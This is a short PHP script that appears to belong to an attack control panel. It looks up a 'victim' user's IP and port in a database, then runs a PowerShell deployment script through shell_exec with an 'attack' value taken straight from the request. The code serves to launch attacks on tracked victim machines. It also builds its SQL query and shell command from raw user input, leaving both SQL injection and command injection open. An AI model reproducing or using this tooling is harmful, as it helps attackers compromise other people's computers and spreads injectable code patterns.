<html>
<pre>
<?php
require 'connect.php';

$user = $_POST['userName'];
$sql = "SELECT CurrentIP, CurrentPort FROM victim WHERE UserName='".$user."'";
$result = $conn->query($sql);
if ($result->num_rows > 0) {
    echo "found rez";
    // output data of each row
    while($row = $result->fetch_assoc()) {
        //gets the ip and port for the selected user
        $ip = $row['CurrentIP'];
        $port = $row['CurrentPort'];
    }
}else{
    echo "0 reuslts";
}

echo(shell_exec("./deployPwsh.sh ".$_POST['attack']." ".$ip." ".$port));
?>
</pre>
</html>